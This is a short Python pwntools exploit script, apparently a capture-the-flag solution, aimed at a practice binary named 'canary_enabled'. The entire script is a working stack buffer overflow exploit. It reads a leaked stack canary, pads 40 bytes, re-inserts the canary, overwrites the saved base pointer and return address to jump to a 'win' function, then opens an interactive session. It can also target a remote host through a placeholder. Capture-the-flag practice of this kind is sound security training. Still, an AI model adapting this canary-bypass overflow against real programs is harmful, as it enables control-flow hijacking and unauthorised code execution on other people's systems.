#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("../canary_enabled")

gs = '''
b *main+105
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Addresses

# Functions

io = start()

io.recvuntil(b"Canary: 0x")
can = io.recvline().strip(b"\n")
can = int(can, 16)
log.info("Canary: %s"%hex(can))


p = b"A"*40
p += p64(can)
p += b"B"*8 # rbp, fill with junk
p += p64(elf.sym['win'])

io.recvuntil(b">>")
io.send(p)

io.interactive()
